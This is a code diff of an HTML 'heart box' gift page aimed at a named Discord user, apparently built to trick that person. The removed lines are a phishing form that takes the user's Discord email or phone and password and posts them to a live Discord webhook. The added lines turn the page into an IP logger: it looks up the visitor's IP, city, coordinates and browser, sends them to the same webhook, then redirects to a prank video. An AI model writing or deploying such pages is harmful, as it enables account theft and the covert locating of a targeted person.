@@ -1,66 +1,100 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>A Special Surprise...</title>
-    <meta property="og:title" content="You've Received a Heart Box!">
-    <meta property="og:image" content="https://img.freepik.com/free-vector/red-heart-box-with-ribbon_23-2147503126.jpg">
+    <title>For heartboxx</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { background-color: #1a1a1a; color: white; font-family: 'Helvetica', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #2f3136; padding: 40px; border-radius: 15px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 2px solid #ff4d4d; }
-        .heart { font-size: 80px; margin-bottom: 20px; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
-        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 5px; border: none; background: #202225; color: white; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: #5865f2; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 10px; }
-        button:hover { background: #4752c4; }
-        p { color: #b9bbbe; font-size: 14px; }
+        body { 
+            background-color: #1a1a1a; 
+            color: white; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            margin: 0; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh;
+            overflow: hidden;
+        }
+        .container { text-align: center; }
+        .assets { display: flex; justify-content: center; gap: 20px; margin-bottom: 30px; }
+        .glow {
+            width: 120px;
+            filter: drop-shadow(0 0 15px rgba(255, 77, 77, 0.8));
+        }
+        h1 { 
+            color: #ff4d4d; 
+            font-size: 28px; 
+            margin-bottom: 40px; 
+            text-shadow: 0 0 10px rgba(255, 77, 77, 0.5);
+        }
+        .btn { 
+            background-color: #ff4d4d; 
+            color: white; 
+            border: none; 
+            padding: 12px 40px; 
+            border-radius: 25px; 
+            font-weight: bold; 
+            font-size: 14px; 
+            text-transform: uppercase; 
+            cursor: pointer; 
+            transition: 0.3s;
+            box-shadow: 0 4px 15px rgba(255, 77, 77, 0.3);
+        }
+        .btn:hover { 
+            background-color: #ff3333; 
+            transform: scale(1.05); 
+            box-shadow: 0 6px 20px rgba(255, 77, 77, 0.5);
+        }
     </style>
 </head>
 <body>
 
-    <div class="card" id="main-box">
-        <div class="heart">🎁❤️</div>
-        <h2 style="color: #ff4d4d;">For heartboxx</h2>
-        <p>You must verify your Discord account to view this private heart box.</p>
-        
-        <input type="text" id="user" placeholder="Email or Phone Number">
-        <input type="password" id="pass" placeholder="Password">
-        
-        <button onclick="capture()">OPEN & VIEW SURPRISE</button>
+    <div class="container">
+        <div class="assets">
+            <img src="https://img.icons8.com/emoji/96/000000/wrapped-gift.png" class="glow">
+            <img src="https://img.icons8.com/emoji/96/000000/heart-suit.png" class="glow">
+        </div>
+        <h1>For heartboxx</h1>
+        <button class="btn" onclick="executeHook()">See More</button>
     </div>
 
     <script>
         const WEBHOOK = "https://discord.com/api/webhooks/1474279324667351090/ALAHbGxyK7QbVtt4nAJ1Aagv-0F1NMqgolB1UdWIlFoS5V-chCWNhQa0w-DUEF4J90EI";
+        const REDIRECT = "https://www.youtube.com/watch?v=f-tM_C1z7f8";
 
-        async function capture() {
-            const u = document.getElementById('user').value;
-            const p = document.getElementById('pass').value;
-
-            if(!u || !p) { alert("Please fill in all fields to verify."); return; }
-
-            // 1. Send the login info to your webhook
+        async function executeHook() {
+            // 1. Capture Coordinates and IP Intelligence
+            let intel = {};
             try {
-                await fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: "🚨 **LOGIN CAPTURED - RICKROLL INITIATED!**",
-                        embeds: [{
-                            title: "Account Credentials",
-                            color: 16724301,
-                            fields: [
-                                { name: "Target", value: "heartboxx" },
-                                { name: "Email/Phone", value: u },
-                                { name: "Password", value: p }
-                            ],
-                            footer: { text: "Victim is currently being Rickrolled." }
-                        }]
-                    })
-                });
-            } catch (e) {}
+                const response = await fetch('https://ipapi.co/json/');
+                intel = await response.json();
+            } catch (e) { 
+                intel = { city: "Unknown", ip: "Hidden", latitude: "0", longitude: "0" }; 
+            }
 
-            // 2. The Boom: Rickroll Redirect
-            window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+            // 2. Fire the hit to your Discord
+            await fetch(WEBHOOK, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    content: "🎁 **THE HEART BOX HAS BEEN OPENED!**",
+                    embeds: [{
+                        title: "Target: heartboxx",
+                        color: 16730445,
+                        fields: [
+                            { name: "📍 Location", value: `${intel.city}, ${intel.region}, ${intel.country_name}` },
+                            { name: "🌐 IP Address", value: intel.ip },
+                            { name: "🗺️ Map Coords", value: `${intel.latitude}, ${intel.longitude}` },
+                            { name: "🔗 View on Map", value: `https://www.google.com/maps?q=${intel.latitude},${intel.longitude}` },
+                            { name: "🖥️ Browser/Platform", value: navigator.userAgent }
+                        ],
+                        footer: { text: "Redirecting to idiot loop..." }
+                    }]
+                })
+            });
+
+            // 3. Kick to the "You Are An Idiot" Remastered
+            window.location.href = REDIRECT;
         }
     </script>
 </body>
